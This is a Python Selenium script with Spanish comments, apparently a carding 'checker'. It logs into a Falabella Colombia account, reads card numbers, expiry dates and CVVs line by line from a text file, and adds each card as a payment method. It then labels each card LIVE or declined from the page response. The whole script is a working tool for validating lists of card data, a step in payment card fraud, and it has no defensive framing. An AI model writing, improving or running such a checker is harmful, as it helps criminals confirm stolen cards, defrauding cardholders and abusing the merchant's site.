from selenium import webdriver
from selenium.webdriver.common.by import By
import time

# ==== DATOS DE LA CUENTA FALABELLA ====
EMAIL = "tu_correo@ejemplo.com"
PASSWORD = "tu_contraseña"
CHROMEDRIVER_PATH = "./chromedriver"

# ==== LEER TARJETAS DESDE EL ARCHIVO ====
def cargar_tarjetas(archivo):
    tarjetas = []
    with open(archivo, "r") as f:
        for linea in f:
            partes = linea.strip().split("|")
            if len(partes) == 3:
                tarjetas.append({
                    "numero": partes[0],
                    "fecha": partes[1],
                    "cvv": partes[2]
                })
    return tarjetas

# ==== INICIAR SESIÓN EN FALABELLA ====
def iniciar_sesion(driver):
    driver.get("https://www.falabella.com.co/falabella-co")
    time.sleep(2)

    driver.find_element(By.ID, "header-profile-button").click()
    time.sleep(2)

    driver.find_element(By.ID, "emailAddress").send_keys(EMAIL)
    driver.find_element(By.ID, "continue").click()
    time.sleep(2)

    driver.find_element(By.ID, "password").send_keys(PASSWORD)
    driver.find_element(By.ID, "login").click()
    time.sleep(5)

# ==== AGREGAR TARJETA ====
def verificar_tarjeta(driver, tarjeta):
    try:
        driver.get("https://www.falabella.com.co/falabella-co/myaccount/paymentMethods")
        time.sleep(5)

        driver.find_element(By.XPATH, "//button[contains(text(), 'Agregar tarjeta')]").click()
        time.sleep(2)

        driver.find_element(By.NAME, "cardNumber").send_keys(tarjeta["numero"])
        driver.find_element(By.NAME, "expiry").send_keys(tarjeta["fecha"])
        driver.find_element(By.NAME, "cvc").send_keys(tarjeta["cvv"])
        driver.find_element(By.XPATH, "//button[contains(text(), 'Guardar')]").click()
        time.sleep(5)

        source = driver.page_source.lower()
        if "tarjeta fue agregada" in source or "fue añadida" in source:
            return "✅ LIVE"
        elif "no fue posible" in source or "tarjeta inválida" in source or "error" in source:
            return "❌ DECLINADA"
        else:
            return "⚠️ INDETERMINADO"
    except Exception as e:
        return f"❗ ERROR: {e}"

# ==== PROCESO PRINCIPAL ====
def main():
    tarjetas = cargar_tarjetas("tarjeta.txt")

    options = webdriver.ChromeOptions()
    options.add_argument("--start-maximized")
    driver = webdriver.Chrome(executable_path=CHROMEDRIVER_PATH, options=options)

    try:
        iniciar_sesion(driver)

        for i, tarjeta in enumerate(tarjetas):
            print(f"\n🔍 Verificando tarjeta {i+1}: {tarjeta['numero']}")
            resultado = verificar_tarjeta(driver, tarjeta)
            print(f"Resultado: {resultado}")

    finally:
        driver.quit()

if __name__ == "__main__":
    main()
